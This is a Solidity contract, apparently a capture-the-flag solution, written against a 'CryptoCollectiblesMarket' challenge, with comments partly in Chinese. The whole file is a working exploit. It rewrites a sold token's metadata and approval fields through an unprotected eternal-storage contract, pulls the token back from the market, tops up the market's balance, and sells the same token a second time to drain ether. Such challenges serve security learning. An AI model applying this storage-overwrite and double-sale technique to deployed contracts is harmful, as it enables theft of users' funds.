pragma solidity 0.7.0;

import "./Setup.sol";

contract marketExploit {
    marketSetup public setup;
    EternalStorageAPI public eternalStorage;
    CryptoCollectibles public token;
    CryptoCollectiblesMarket public market;
    constructor(address _setup) payable {
        setup = marketSetup(_setup);
        eternalStorage = setup.eternalStorage();
        token = setup.token();
        market = setup.market();
        require(msg.value == 70 ether);
        bytes32 token_0 = market.mintCollectibleFor{value: 70 ether}(address(this));
        //修改token_0.metadata, 让它等于address(this)
        eternalStorage.updateMetadata(token_0,address(this));
        //approve token
        token.approve(token_0, address(market));
        //卖出该token_0, tokenId为token_0
        market.sellCollectible(token_0);
        //get token_1
        bytes32 token_1 = bytes32(uint256(token_0)+2);
        //updateName->approval
        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));
        // transferFrom
        token.transferFrom(token_0, address(market), address(this));
        token.approve(token_0, address(market));
        //fix price
        uint tokenPrice = msg.value * 10000 / (10000 + 1000);
        uint missingBalance = tokenPrice - address(market).balance;
        //补偿缺少的ETH
        market.mintCollectible{value:missingBalance}();
        //sellAgain
        market.sellCollectible(token_0);
    }
}
